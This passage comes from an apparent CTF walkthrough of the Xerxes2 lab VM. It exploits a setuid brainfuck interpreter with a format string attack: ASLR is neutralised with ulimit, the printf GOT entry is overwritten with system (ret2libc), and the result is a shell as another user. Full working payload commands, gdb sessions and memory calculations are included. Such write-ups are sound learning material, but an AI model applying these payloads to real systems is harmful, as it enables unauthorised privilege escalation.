<li>Calculate the required padding of strings to get the correct memory address, and write it using the <code>%n</code> format string.</li>
<li>Profit?</li>
</ul>
<p>While this is all fine and dandy, it was not possible for me to <em>profit</em> with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. <code>/opt/bf</code> was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D</p>
<p>So, let me take this step by step on how <code>/opt/bf</code> can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.</p>
<h3 id=optbf---part1>/opt/bf - part1<a hidden class=anchor aria-hidden=true href=#optbf---part1>#</a></h3>
<p>To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:</p>
<ul>
<li><a href=http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html>http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
<li><a href=http://codearcana.com/posts/2013/04/28/picoctf-videos.html>http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a></li>
<li><a href=http://youtu.be/NwzmYSlETI8>http://youtu.be/NwzmYSlETI8</a></li>
<li><a href=http://youtu.be/CHrs30g-3O0>http://youtu.be/CHrs30g-3O0</a></li>
</ul>
<p>So, lets work with this.</p>
<p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>></code>, preparing for the next character.</p>
<p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ echo <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;+&#34; * ord(&#34;a&#34;)&#39;</span><span style=color:#66d9ef>)</span>
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
delacroix@xerxes2:~$ /opt/bf <span style=color:#e6db74>&#34;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&#34;</span>
a
</code></pre></div><p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ /opt/bf <span style=color:#e6db74>&#34;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&#34;</span>
aa
</code></pre></div><p>2 <code>a</code>&rsquo;s! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href=https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions>list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>print <span style=color:#e6db74>&#34;&gt;&#34;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#34;+&#34;</span> <span style=color:#f92672>*</span> ord(x) <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> (<span style=color:#e6db74>&#34;the quick brown fox&#34;</span>)])
</code></pre></div><p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>
<p>Anyways, that settled the brainfk problem.</p>
<h3 id=optbf---part2>/opt/bf - part2<a hidden class=anchor aria-hidden=true href=#optbf---part2>#</a></h3>
<p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ /opt/bf <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;AAAA&#34; + &#34;.%x&#34; * 20 + &#34;\n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
</code></pre></div><p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ /opt/bf <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;AAAA&#34; + &#34;.%16$x&#34; &#34;\n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
AAAA.41414141
</code></pre></div><p>Yup! Parameter 16 gives us what we need :)</p>
<p>Great. Were making progress&mldr; I think.</p>
<p>For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.</p>
<h3 id=optbf---part3>/opt/bf - part3<a hidden class=anchor aria-hidden=true href=#optbf---part3>#</a></h3>
<p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>
<p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
</code></pre></div><p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0xb7734000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span style=color:#f92672>(</span>0xb75c9000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0xb7735000<span style=color:#f92672>)</span>
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0xb779b000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span style=color:#f92672>(</span>0xb7630000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0xb779c000<span style=color:#f92672>)</span>
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0xb77c0000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span style=color:#f92672>(</span>0xb7655000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0xb77c1000<span style=color:#f92672>)</span>
delacroix@xerxes2:~$
</code></pre></div><p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ ulimit -s unlimited

delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0x4001e000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span style=color:#f92672>(</span>0x40026000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0x40000000<span style=color:#f92672>)</span>
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0x4001e000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span style=color:#f92672>(</span>0x40026000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0x40000000<span style=color:#f92672>)</span>
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0x4001e000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span style=color:#f92672>(</span>0x40026000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0x40000000<span style=color:#f92672>)</span>
delacroix@xerxes2:~$
</code></pre></div><p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ objdump -R /opt/bf

/opt/bf:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    __gmon_start__
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   __gmon_start__
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar


delacroix@xerxes2:~$
</code></pre></div><p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href=http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf>ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href=http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf>this pdf</a> for a proper explanation on what exactly this means.</p>
<p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> run
Starting program: /opt/bf
usage: /opt/bf <span style=color:#f92672>[</span>program<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>Inferior <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>process 11342<span style=color:#f92672>)</span> exited with code 0377<span style=color:#f92672>]</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> print system
$1 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>&lt;text variable, no debug info&gt;<span style=color:#f92672>}</span> 0x40062000 &lt;system&gt;
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>Soooo, 0x40062000. We have the point in memory where <code>system()</code> lives, and we know where the program is going to go to lookup the <code>printf</code> function. All that is left now is to exploit the format string vulnerability, override the location of <code>printf</code> with <code>system</code>, and provide a new argument for the now fooled <code>printf</code> to run. A new argument can be given by simply providing another <code>#</code> (remember we have the source so that was easy to figure out).</p>
<h3 id=optbf---part4>/opt/bf - part4<a hidden class=anchor aria-hidden=true href=#optbf---part4>#</a></h3>
<p>We have all the information we need, lets get to work.</p>
<p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>
<p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass main
Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
   0x08048684 &lt;+0&gt;: push   %ebp
   0x08048685 &lt;+1&gt;: mov    %esp,%ebp
   0x08048687 &lt;+3&gt;: and    $0xfffffff0,%esp
   0x0804868a &lt;+6&gt;: sub    $0x7540,%esp
   0x08048690 &lt;+12&gt;:    cmpl   $0x1,0x8<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
   0x08048694 &lt;+16&gt;:    jg     0x80486b7 &lt;main+51&gt;
   0x08048696 &lt;+18&gt;:    mov    0xc<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>,%eax
   0x08048699 &lt;+21&gt;:    mov    <span style=color:#f92672>(</span>%eax<span style=color:#f92672>)</span>,%eax
   0x0804869b &lt;+23&gt;:    mov    %eax,0x4<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x0804869f &lt;+27&gt;:    movl   $0x804887c,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x080486a6 &lt;+34&gt;:    call   0x8048390 &lt;printf@plt&gt;
   0x080486ab &lt;+39&gt;:    movl   $0xffffffff,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x080486b2 &lt;+46&gt;:    call   0x80483c0 &lt;exit@plt&gt;
   0x080486b7 &lt;+51&gt;:    movl   $0x7530,0x8<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x080486bf &lt;+59&gt;:    movl   $0x0,0x4<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x080486c7 &lt;+67&gt;:    lea    0x10<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>,%eax
   0x080486cb &lt;+71&gt;:    mov    %eax,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x080486ce &lt;+74&gt;:    call   0x80483e0 &lt;memset@plt&gt;
   0x080486d3 &lt;+79&gt;:    mov    0xc<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>,%eax
   0x080486d6 &lt;+82&gt;:    add    $0x4,%eax
   0x080486d9 &lt;+85&gt;:    mov    <span style=color:#f92672>(</span>%eax<span style=color:#f92672>)</span>,%eax
   0x080486db &lt;+87&gt;:    lea    0x10<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>,%edx
   0x080486df &lt;+91&gt;:    mov    %edx,0x4<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x080486e3 &lt;+95&gt;:    mov    %eax,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
   0x080486e6 &lt;+98&gt;:    call   0x80484ec &lt;bf&gt;
   0x080486eb &lt;+103&gt;:   movl   $0x0,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span> <span style=color:#75715e># &lt;-- we will break here</span>
   0x080486f2 &lt;+110&gt;:   call   0x80483c0 &lt;exit@plt&gt;
End of assembler dump.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> break *0x080486eb
Breakpoint <span style=color:#ae81ff>1</span> at 0x80486eb

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> run <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;%16$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
Starting program: /opt/bf <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;%16$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>

Breakpoint 1, 0x080486eb in main <span style=color:#f92672>()</span>

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049a48
0x8049a48 &lt;printf@got.plt&gt;: 0x00000004
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>Oooooooooooh. So basically 0x8049a48 now says <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> shell echo <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print 0x2000-0x4&#39;</span><span style=color:#66d9ef>)</span>
<span style=color:#ae81ff>8188</span> <span style=color:#75715e># output is a decimal value</span>
</code></pre></div><p>We now pad the format string as required, re-run the program in <code>gdb</code>, and inspect 0x08049a48 from the GOT</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> run <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
The program being debugged has been started already.
Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y

Starting program: /opt/bf <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
H�
Breakpoint 1, 0x080486eb in main <span style=color:#f92672>()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049a48
0x8049a48 &lt;printf@got.plt&gt;: 0x00002000
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> run <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34; + &#34;%17$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
The program being debugged has been started already.
Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y

Starting program: /opt/bf <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8188u%16$n&#34; + &#34;%17$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
H�J�                                                                                                                                                                                                              <span style=color:#ae81ff>3</span>
Breakpoint 1, 0x080486eb in main <span style=color:#f92672>()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049a48
0x8049a48 &lt;printf@got.plt&gt;: 0x20042004
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> shell echo <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print 0x4006-0x2000&#39;</span><span style=color:#66d9ef>)</span>
<span style=color:#ae81ff>8198</span> <span style=color:#75715e># output is a decimal value</span>

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> run <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8184u%16$n&#34; + &#34;%8198u%17$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
The program being debugged has been started already.
Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y

Starting program: /opt/bf <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8184u%16$n&#34; + &#34;%8198u%17$n&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>#&#34;</span>
H�J�
Breakpoint 1, 0x080486eb in main <span style=color:#f92672>()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049a48
0x8049a48 &lt;printf@got.plt&gt;: 0x40062000
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>
<h3 id=optbf---part5>/opt/bf - part5<a hidden class=anchor aria-hidden=true href=#optbf---part5>#</a></h3>
<p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ /opt/bf <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;\x48\x9a\x04\x08&#34; + &#34;\x4a\x9a\x04\x08&#34; + &#34;%8184u%16$n&#34; + &#34;%8198u%17$n&#34; + &#34;;/bin/sh&#34;)])&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>##&#34;</span>
H�J�                                                                                                                                                                                                              d
$ id
uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>delacroix<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>delacroix<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>polito<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>polito<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>polito<span style=color:#f92672>)</span>,1002<span style=color:#f92672>(</span>delacroix<span style=color:#f92672>)</span>
$
</code></pre></div><p>Oly. Crap. That. Was. Awesome. :D :D</p>
<p>We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.</p>
<h2 id=becoming-korenchkin>becoming korenchkin<a hidden class=anchor aria-hidden=true href=#becoming-korenchkin>#</a></h2>
<p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>
<p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>polito@xerxes2:~$ ls -lh
total 43M
-rw-r--r-- <span style=color:#ae81ff>1</span> polito polito 140K Jul <span style=color:#ae81ff>16</span> 10:57 audio.txt
-rw-r--r-- <span style=color:#ae81ff>1</span> polito polito  43M Jul <span style=color:#ae81ff>16</span> 12:17 dump.gpg
-rw-r--r-- <span style=color:#ae81ff>1</span> polito polito  27K Jul <span style=color:#ae81ff>16</span> 12:19 polito.pdf
polito@xerxes2:~$ crontab -l
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
@reboot <span style=color:#66d9ef>while</span> true ; <span style=color:#66d9ef>do</span> nc -l -p <span style=color:#ae81ff>4444</span> &lt; /home/polito/audio.txt ; <span style=color:#66d9ef>done</span>
polito@xerxes2:~$
</code></pre></div><p>There was not much I could do with the <code>dump.gpg</code> yet, so I decided to open up the pdf in a pdf viewer:</p>
<figure>
<img loading=lazy src=/images/xerxesII_polito_pdf.png>
</figure>
<p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&mldr;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>polito@xerxes2:~$ file -k polito.pdf
polito.pdf: x86 boot sector, code offset 0xe0 DBase <span style=color:#ae81ff>3</span> data file with memo<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>1146103071</span> records<span style=color:#f92672>)</span>
</code></pre></div><p>&mldr;<em>x86 boot sector</em>&mldr; wait&mldr; <strong>WHAT</strong>?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ae81ff>00000000</span>  <span style=color:#ae81ff>83</span> E0 FF EB  1F <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>44</span>   <span style=color:#ae81ff>46</span> 2D <span style=color:#ae81ff>31</span> 2E  <span style=color:#ae81ff>35</span> 0A <span style=color:#ae81ff>39</span> <span style=color:#ae81ff>39</span> .....%PDF-1.5.99
<span style=color:#ae81ff>00000010</span>  <span style=color:#ae81ff>39</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>20</span>  6F <span style=color:#ae81ff>62</span> 6A 0A   3C 3C 3E 3E  0A <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>9</span> <span style=color:#ae81ff>0</span> obj.&lt;&lt;&gt;&gt;.str
